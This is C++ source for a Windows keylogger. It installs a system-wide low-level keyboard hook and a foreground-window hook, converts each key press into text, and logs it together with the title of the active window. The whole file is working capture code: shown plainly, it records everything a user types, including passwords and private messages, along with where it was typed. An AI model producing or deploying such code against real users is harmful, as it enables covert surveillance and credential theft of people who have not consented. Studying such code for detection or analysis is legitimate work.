#include "winkey.hpp"

std::string get_non_alphanumeric_key(KBDLLHOOKSTRUCT* kbStruct) {
    char key_name[256] = { 0 };
    memset(key_name, 0, sizeof(key_name));
    LONG dwMsg = 1;
    dwMsg += kbStruct->scanCode << 16;
    dwMsg += kbStruct->flags << 24;
    if (!GetKeyNameTextA(dwMsg, key_name, sizeof(key_name) - 1)) {
        std::cerr << "Last error: " << GetLastError() << std::endl;
    }
    return key_name;
}

std::string get_key_name(KBDLLHOOKSTRUCT* kbStruct) {
    BYTE key_state[256];
    GetKeyboardState(key_state);

    // Check if Shift key is pressed
    bool is_shift_pressed = (GetKeyState(VK_SHIFT) & 0x80) != 0;
    // Check if Caps Lock is on
    bool is_caps_lock_on = (GetKeyState(VK_CAPITAL) & 0x01) != 0;

    // Determine the actual character
    BYTE keyboard_state[256];
    GetKeyboardState(keyboard_state);

    WCHAR wch;
    int result = ToUnicode(kbStruct->vkCode, kbStruct->scanCode, keyboard_state, &wch, 1, 0);

    if (result > 0) {
        // Handle uppercase/lowercase based on Shift and Caps Lock
        WCHAR actual_char = is_shift_pressed ^ is_caps_lock_on ? towupper(wch) : towlower(wch);

        char c = static_cast<char>(actual_char);
        
        if (c == '\a' || c == '\b' || c == '\t' || c == '\n' || c == '\v' || c == '\f' || c == '\r') {
            //std::cout << "[" << get_non_alphanumeric_key(kbStruct) << "]" << std::endl;
            return "[" + get_non_alphanumeric_key(kbStruct) + "]";
        }
        else {
            //std::cout << "std::string: " << std::string(&c, 1) << std::endl;
            return std::string(&c, 1);
        }
    }
        //std::cout << "[" << get_non_alphanumeric_key(kbStruct) << "]" << std::endl;
        return "[" + get_non_alphanumeric_key(kbStruct) + "]";
}

// Define the keyboard event hook 
LRESULT CALLBACK handle_keyboard_event(
    _In_ int    nCode,
    _In_ WPARAM wParam,
    _In_ LPARAM lParam
) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT* kb_struct = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            log_keystroke(get_key_name(kb_struct));
        }
    }
    return CallNextHookEx(g_keyboard_hook, nCode, wParam, lParam);
}

// Define the windows event hook
void CALLBACK handle_windows_event(
    HWINEVENTHOOK hWinEventHook,
    DWORD event,
    HWND hwnd,
    LONG idObject,
    LONG idChild,
    DWORD idEventThread,
    DWORD dwmsEventTime
) {
    (void)hWinEventHook, event, hwnd, idObject, idChild, idEventThread, dwmsEventTime;
    char window_title[256];
    memset(window_title, 0, sizeof(window_title));
    GetWindowText(hwnd, window_title, sizeof(window_title));
    log_window_title(window_title);
}

int install_windows_hook() {
    // Install the WinEvent hook for tracking foreground window changes
    g_windows_hook =
        SetWinEventHook(
            EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND,   // Range of events (0x3 to 0x3).
            NULL,                                               // Handle to DLL.
            handle_windows_event,                               // The callback.
            0, 0,                                               // Process and thread IDs of interest (0 = all)
            WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);   // Flags.
    
    if (g_windows_hook == NULL) {
        std::cerr << "Failed to install windows hook." << std::endl;
        return 0;
    }

    std::cout << "Windows hook installed." << std::endl;
    return 1;
}

int install_keyboard_hook() {
    // Install the low-level keyboard hook for tracking keyboard events
    g_keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, handle_keyboard_event, NULL, 0);

    if (g_keyboard_hook == NULL) {
        std::cerr << "Failed to install keyboard hook." << std::endl;
        return 0;
    }

    std::cout << "Keyboard hook installed." << std::endl;
    return 1;
}
